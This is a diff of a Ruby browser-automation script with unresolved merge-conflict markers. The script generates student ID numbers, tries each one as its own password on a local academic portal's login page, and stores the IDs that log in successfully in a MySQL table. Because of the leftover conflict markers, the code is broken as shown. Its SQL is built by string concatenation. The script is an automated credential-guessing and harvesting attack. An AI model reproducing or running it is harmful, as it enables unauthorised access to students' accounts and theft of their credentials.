@@ -12,8 +12,14 @@ client = Mysql2::Client.new(:host => "localhost", :username => "root", :password
 @@baseUrl = "http://192.168.0.55/"
 @@browser = Watir::Browser.new :chrome
 
+<<<<<<< HEAD
 @@NIM = [ "K1A1"]
 @@tahun = [ "20" ]
+=======
+# @@NIM = ['C1A1', 'C1B1', 'C1B3', 'C1D1', 'C1G1', 'C1E1' ]
+@@NIM = ['C1C1', 'C1D3', 'C1F1', 'S1A1', 'C1D7', 'S1B1' ]
+@@tahun = [ "19" ]
+>>>>>>> a17b5d7c286297f2d2a61983a11992108ddd8d19
 @@_end = 150
 
 @@ii = 0
@@ -26,6 +32,10 @@ begin
         nim = "#{@@NIM[@@ii]}" +"#{@@tahun[0]}"+"#{@@no}"
         pass = nim
         puts( nim )
+<<<<<<< HEAD
+=======
+        puts( "tables" )
+>>>>>>> a17b5d7c286297f2d2a61983a11992108ddd8d19
     
         @@browser.goto @@baseUrl + "/index.php?exec=login"
         @@browser.text_field(:name => "NIP").set nim
@@ -33,6 +43,7 @@ begin
         @@browser.input(:type => "submit" ).click 
     
         sleep(1)    
+<<<<<<< HEAD
         if  @@browser.tables( :class => "box" ).length > 1
             begin
                 text = @@browser.tables( :class => "box" )[1].tbody.trs[1].tds[1].text
@@ -62,6 +73,15 @@ begin
             rescue
                 ap "failed to save data"
             end
+=======
+        if @@browser.table(:class => "main" ).exists?
+            query = "INSERT INTO `users` (`id`, `nim`, `pass` ) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}' "+ ")"
+            puts( query )
+            
+            client.query(query)
+            @@browser.link(:href => "ademik.php?logout=1" ).click
+            
+>>>>>>> a17b5d7c286297f2d2a61983a11992108ddd8d19
         end
         sleep(2)
         $i +=1;
